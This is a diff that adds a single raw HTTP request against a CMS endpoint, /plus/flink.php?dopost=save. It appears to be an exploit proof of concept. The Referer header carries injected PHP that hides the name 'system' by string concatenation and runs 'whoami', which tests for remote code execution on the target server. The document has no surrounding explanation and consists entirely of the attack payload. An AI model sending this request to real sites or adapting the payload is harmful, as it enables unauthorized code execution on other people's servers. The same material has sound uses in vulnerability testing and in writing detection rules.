@@ -1,0 +1,5 @@
+GET /plus/flink.php?dopost=save HTTP/1.1
+Host: target
+User-Agent: Mozilla/5.0
+Referer: <?php $a='syste';$b='m';$c=$a.$b;$c('whoami');?>
+Connection: close
